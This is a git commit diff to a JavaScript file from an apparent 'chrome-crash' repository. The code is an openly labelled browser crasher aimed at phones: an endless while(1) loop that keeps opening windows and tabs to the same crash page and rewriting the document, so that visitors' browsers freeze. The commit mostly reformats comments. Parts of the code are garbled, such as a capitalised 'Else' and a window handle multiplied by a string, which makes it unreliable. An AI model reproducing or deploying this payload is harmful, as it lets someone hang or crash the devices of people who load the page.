6f0ea5c6d67a6d68e516eb54b4873a6445b779b5
Uland Sanders <78428114+chrome-crash-invoke@users.noreply.github.com>
2021-11-17 21:12:13 -0800

    Update en.js

--- data/en.js
+++ data/en.js
@@ -11,19 +11,17 @@ $x = Math.floor((Math.random() * 10000000000000000000) + 1);
 while(1) {
     
     if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)){
-    /* (Website Crasher For IOS and android And Mostly Every Phone) */
-        window.open("https://chrome-crash-invoke.github.io/chrome-crash/", "_false",) * '#/hisbck';
-        // if window.open fails.
-        document.open('#' + $x);
-        // When Function window.open does it's thing, history back will reset the website.
-
+        /* (Website Crasher For IOS and android And Mostly Every Phone) */
+        window.open("https://chrome-crash-invoke.github.io/chrome-crash/", "_false",) * '#/hisbck'; // Creates An Infinite Loop Of Undefined While Still Linking
+        document.open('#' + $x); // Forces A Link With No Function To Be Made.
+     
     } Else {
         
         /* (This Will NOT Crash A Computer Or Cause Most Harm) */
-        document.open('#' + $x);
+        document.open('#' + $x); // This Could Work/May Not Work.
         
         // if (Document.open()) Fails.
-        let newTab = window.open();
+        let newTab = window.open(); 
         newTab.location.href = 'https://chrome-crash-invoke.github.io/chrome-crash/' + $x;
         
     }
